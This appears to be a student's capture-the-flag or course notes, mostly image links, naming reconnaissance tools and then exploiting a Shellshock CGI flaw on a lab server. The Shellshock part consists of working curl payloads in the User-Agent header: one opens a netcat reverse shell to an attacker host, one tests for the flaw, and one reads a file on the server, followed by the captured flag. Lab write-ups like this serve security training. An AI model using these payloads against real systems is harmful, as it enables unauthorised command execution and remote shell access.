<img width="456" height="293" alt="image" src="https://github.com/user-attachments/assets/4af06be3-3a6b-4c72-9b64-edaeb9ec9e2b" />



netcraft
urlscan.io

<img width="455" height="202" alt="image" src="https://github.com/user-attachments/assets/267c1768-3b05-4fc4-bd76-afd3a9508a00" />




The harvester



<img width="431" height="209" alt="image" src="https://github.com/user-attachments/assets/fddc6972-6836-475b-ac80-ee56f535837a" />


<img width="1424" height="741" alt="image" src="https://github.com/user-attachments/assets/0a1d7d90-b50a-46c8-bc0c-6d63ee6671e1" />


------------



## week two - second day


<img width="432" height="211" alt="image" src="https://github.com/user-attachments/assets/95d5e7ad-a591-4672-a0f0-acff7e2156a7" />

---

<img width="388" height="160" alt="image" src="https://github.com/user-attachments/assets/58ff9947-f60e-4a36-9ef0-2497d8a60654" />





curl -s -D - \
  -H 'User-Agent: () { :; }; /bin/bash -c nc 192.168.92.128 4444 -e /bin/sh' \
  'http://13.56.213.177/cgi-bin/status?_cb=1' | sed -n '1,200p'



```
curl -s -D - \
  -H 'User-Agent: () { :; }; /bin/bash -c "echo; echo VULNTEST"' \
  'http://13.56.213.177/cgi-bin/status?_cb=1' | sed -n '1,200p'

```





```
curl -s -D - \
  -H 'User-Agent: () { :; }; /bin/bash -c "echo; echo START; cat /home/inside; echo END"' \
  'http://13.56.213.177/cgi-bin/status?_cb=ts' | sed -n '1,200p'

```


 
```
FLAG{InSiDe_ShOcK_WaVe_StAy_HoMe_StAy_SaFe}
```










